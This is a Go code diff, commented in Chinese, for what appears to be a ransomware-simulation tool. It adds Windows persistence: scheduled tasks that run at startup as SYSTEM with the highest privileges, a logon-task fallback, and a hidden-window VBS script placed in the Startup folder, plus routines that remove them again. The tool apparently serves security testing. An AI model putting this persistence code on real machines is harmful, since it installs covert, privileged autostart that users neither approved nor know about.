@@ -19,7 +19,180 @@ import (
 const (
 	defaultScheduleTaskName = "RansomSimTask"
 	scheduledRunMarker      = "--scheduled-run"
+	daemonChildMarker       = "--daemon-child"
+	daemonLogFileName       = "scheduler.log"
+	doneMarkerPrefix        = ".schedule_done_"
 )
+
+// isDaemonChild 判断当前进程是否为自动转入后台的子进程
+func isDaemonChild() bool {
+	for _, arg := range os.Args[1:] {
+		if arg == daemonChildMarker || arg == "-"+strings.TrimLeft(daemonChildMarker, "-") {
+			return true
+		}
+	}
+	return false
+}
+
+// scheduleTaskNameOf 返回清洗后的任务名（用于自启项与状态文件名）
+func scheduleTaskNameOf(raw string) string {
+	name := strings.TrimSpace(raw)
+	if name == "" {
+		name = defaultScheduleTaskName
+	}
+	var b strings.Builder
+	for _, r := range name {
+		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
+			b.WriteRune(r)
+		} else {
+			b.WriteRune('_')
+		}
+	}
+	if b.Len() == 0 {
+		return defaultScheduleTaskName
+	}
+	return b.String()
+}
+
+// scheduleLogPath 后台子进程日志路径（程序目录）
+func scheduleLogPath() string {
+	return filepath.Join(programDir, daemonLogFileName)
+}
+
+// buildDaemonArgs 构造后台子进程参数：去掉原定时参数，改为绝对时间 + 子进程标记
+func buildDaemonArgs(target time.Time) []string {
+	args := stripScheduleFlags(os.Args[1:])
+	out := make([]string, 0, len(args)+3)
+	for _, a := range args {
+		if a == scheduledRunMarker || a == daemonChildMarker {
+			continue
+		}
+		out = append(out, a)
+	}
+	out = append(out, "--at", target.Format(time.RFC3339), daemonChildMarker)
+	return out
+}
+
+// 定时任务完成标记，避免重启后重复执行
+func doneMarkerPath(opt *options) string {
+	return filepath.Join(programDir, doneMarkerPrefix+scheduleTaskNameOf(opt.scheduleTaskName))
+}
+
+func clearScheduleDone(opt *options) { _ = os.Remove(doneMarkerPath(opt)) }
+
+func markScheduleDone(opt *options) {
+	_ = os.WriteFile(doneMarkerPath(opt), []byte(time.Now().Format(time.RFC3339)+"\n"), 0600)
+}
+
+func isScheduleDone(opt *options) bool {
+	_, err := os.Stat(doneMarkerPath(opt))
+	return err == nil
+}
+
+// autoStartTaskName 开机自启任务名
+func autoStartTaskName(taskName string) string {
+	return scheduleTaskNameOf(taskName) + "-Auto"
+}
+
+// buildCommandLine 把程序路径与参数拼成 Windows 命令行（含空格的参数加引号）
+func buildCommandLine(exePath string, args []string) string {
+	parts := []string{"\"" + exePath + "\""}
+	for _, a := range args {
+		if a == "" {
+			continue
+		}
+		if strings.ContainsAny(a, " \t") {
+			parts = append(parts, "\""+a+"\"")
+		} else {
+			parts = append(parts, a)
+		}
+	}
+	return strings.Join(parts, " ")
+}
+
+// startupShortcutPath 当前用户启动文件夹中的自启脚本路径
+func startupShortcutPath(taskName string) string {
+	appData := os.Getenv("APPDATA")
+	if appData == "" {
+		return ""
+	}
+	return filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup",
+		"RansomSimAuto-"+scheduleTaskNameOf(taskName)+".vbs")
+}
+
+// registerStartupFolderFallback 在“启动”文件夹写入 VBS 自启脚本（无需管理员权限，登录后生效）
+func registerStartupFolderFallback(opt *options, target time.Time) error {
+	vbsPath := startupShortcutPath(opt.scheduleTaskName)
+	if vbsPath == "" {
+		return fmt.Errorf("无法定位启动文件夹 (APPDATA 为空)")
+	}
+	if err := os.MkdirAll(filepath.Dir(vbsPath), 0755); err != nil {
+		return fmt.Errorf("创建启动文件夹失败: %w", err)
+	}
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("无法获取程序路径: %w", err)
+	}
+	exePath, _ = filepath.Abs(exePath)
+
+	commandLine := buildCommandLine(exePath, buildDaemonArgs(target))
+	// VBS 字符串中双引号需写成两个双引号
+	vbsCommand := strings.ReplaceAll(commandLine, "\"", "\"\"")
+	content := "CreateObject(\"WScript.Shell\").Run \"" + vbsCommand + "\", 0, False\r\n"
+	if err := os.WriteFile(vbsPath, []byte(content), 0600); err != nil {
+		return fmt.Errorf("写入启动脚本失败: %w", err)
+	}
+	if logEnabled {
+		logOperation("已写入启动文件夹自启脚本: " + vbsPath)
+	}
+	return nil
+}
+
+// registerAutoStart 注册 Windows 开机自启：
+// 1) 计划任务 ONSTART（需管理员） 2) 计划任务 ONLOGON 3) 启动文件夹 VBS（无需管理员）
+func registerAutoStart(opt *options, target time.Time) error {
+	exePath, err := os.Executable()
+	if err != nil {
+		return fmt.Errorf("无法获取程序路径: %w", err)
+	}
+	exePath, _ = filepath.Abs(exePath)
+
+	taskName := autoStartTaskName(opt.scheduleTaskName)
+	args := buildDaemonArgs(target)
+	commandLine := buildCommandLine(exePath, args)
+
+	_ = exec.Command("schtasks", "/delete", "/tn", taskName, "/f").Run()
+
+	attempts := [][]string{
+		{"/create", "/tn", taskName, "/tr", commandLine, "/sc", "ONSTART", "/ru", "SYSTEM", "/rl", "HIGHEST", "/f"},
+		{"/create", "/tn", taskName, "/tr", commandLine, "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"},
+		{"/create", "/tn", taskName, "/tr", commandLine, "/sc", "ONLOGON", "/f"},
+	}
+
+	for _, attempt := range attempts {
+		if out, runErr := exec.Command("schtasks", attempt...).CombinedOutput(); runErr == nil {
+			if logEnabled {
+				logOperation(fmt.Sprintf("已注册开机自启任务 %s", taskName))
+			}
+			return nil
+		} else if strings.Contains(string(out), "Access is denied") {
+			break // 无权限创建计划任务，直接走启动文件夹兜底
+		}
+	}
+
+	if err := registerStartupFolderFallback(opt, target); err == nil {
+		return nil
+	}
+	return fmt.Errorf("计划任务与启动文件夹均注册失败")
+}
+
+// removeAutoStart 删除开机自启任务与启动文件夹脚本
+func removeAutoStart(taskName string) {
+	_ = exec.Command("schtasks", "/delete", "/tn", autoStartTaskName(taskName), "/f").Run()
+	if vbsPath := startupShortcutPath(taskName); vbsPath != "" {
+		_ = os.Remove(vbsPath)
+	}
+}
 
 // formatDuration 把时长格式化为人类可读形式
 func formatDuration(d time.Duration) string {
@@ -178,8 +351,11 @@ func stripScheduleFlags(args []string) []string {
 	}
 	dropAlone := map[string]bool{
 		scheduledRunMarker: true,
+		daemonChildMarker:  true,
 		"--persist-schedule": true, "-persist-schedule": true,
 		"--schedule-cleanup": true, "-schedule-cleanup": true,
+		"--foreground": true, "-foreground": true,
+		"--no-autostart": true, "-no-autostart": true,
 	}
 
 	var out []string
@@ -280,10 +456,16 @@ func registerPersistentSchedule(opt *options, target time.Time) error {
 	return fmt.Errorf("schtasks 创建任务失败: %v (%s)", lastErr, lastOut)
 }
 
-// cleanupPersistentSchedule 删除计划任务（计划任务唤起运行结束后调用）
+// cleanupPersistentSchedule 删除计划任务与开机自启项（计划任务唤起运行结束后调用）
 func cleanupPersistentSchedule(taskName string) {
 	if strings.TrimSpace(taskName) == "" {
 		taskName = defaultScheduleTaskName
+	}
+	removeAutoStart(taskName)
+
+	// 仅当计划任务确实存在时才删除；后台驻留子进程通常没有该任务，避免误报失败
+	if err := exec.Command("schtasks", "/query", "/tn", taskName).Run(); err != nil {
+		return
 	}
 	if err := exec.Command("schtasks", "/delete", "/tn", taskName, "/f").Run(); err != nil {
 		fmt.Printf("[!] 清理计划任务失败: %v\n", err)
